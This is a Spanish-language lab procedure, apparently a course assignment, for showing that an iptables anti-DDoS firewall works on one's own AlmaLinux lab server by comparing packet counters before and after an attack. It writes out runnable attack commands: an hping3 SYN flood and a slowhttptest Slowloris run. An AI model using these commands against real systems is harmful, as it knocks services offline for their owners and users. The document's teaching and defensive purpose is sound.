# Demostracion del ataque DDoS y efectividad del firewall

Este procedimiento genera las evidencias que pide la Parte I, punto 2
(mostrar contadores **antes** y **despues** del ataque).

> **Importante:** ejecute el ataque SOLO contra su propio servidor de laboratorio
> (`10.18.30.x`), nunca contra sistemas de terceros.

---

## En el SERVIDOR (AlmaLinux, 10.18.30.x)

### 1. Aplicar el firewall

```bash
chmod +x firewall-ddos.sh
sudo ./firewall-ddos.sh
```

### 2. Reiniciar contadores y capturar el estado ANTES del ataque

```bash
sudo iptables -Z                       # pone todos los contadores en cero
sudo iptables -L -n -v > antes.txt     # guarda el estado inicial
sudo iptables -L -n -v                 # muestralo en pantalla (captura de pantalla)
```

Fijese en la columna **pkts** de la cadena `DDOS_DROP`: debe estar en `0` o muy bajo.

---

## En el ATACANTE (su PC / Kali, en la misma red 10.18.30.x)

Instale las herramientas si no las tiene:

```bash
sudo apt update && sudo apt install -y hping3 slowhttptest    # Debian/Kali
# o en AlmaLinux/Fedora:  sudo dnf install -y hping3
```

### 3a. Ataque SYN flood (satura con paquetes SYN)

```bash
sudo hping3 --flood -S -p 80 10.18.30.XX
```

Dejelo correr ~20-30 segundos y detengalo con `Ctrl + C`.

### 3b. (Opcional) Ataque de conexiones lentas (Slowloris)

```bash
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.18.30.XX/ -x 24 -p 3
```

---

## De nuevo en el SERVIDOR

### 4. Capturar el estado DESPUES del ataque

```bash
sudo iptables -L -n -v > despues.txt    # guarda el estado final
sudo iptables -L -n -v                  # muestralo (captura de pantalla)
```

Ahora la columna **pkts** de la cadena `DDOS_DROP` (y de las reglas de
proteccion SYN) debe mostrar **miles o millones de paquetes DROP**: esa es la
evidencia de que las reglas estan bloqueando el ataque.

### 5. Comparar antes vs despues

```bash
diff antes.txt despues.txt
```

O, para ver solo el total de paquetes descartados por la cadena DDOS_DROP:

```bash
sudo iptables -L DDOS_DROP -n -v
```

---

## Que incluir en el informe

1. Captura de `iptables -L -n -v` **antes** (contadores en 0).
2. Captura del comando de ataque ejecutandose en el atacante.
3. Captura de `iptables -L -n -v` **despues** (contadores DROP altos).
4. Breve explicacion: que regla bloqueo el ataque y por que subio el contador.
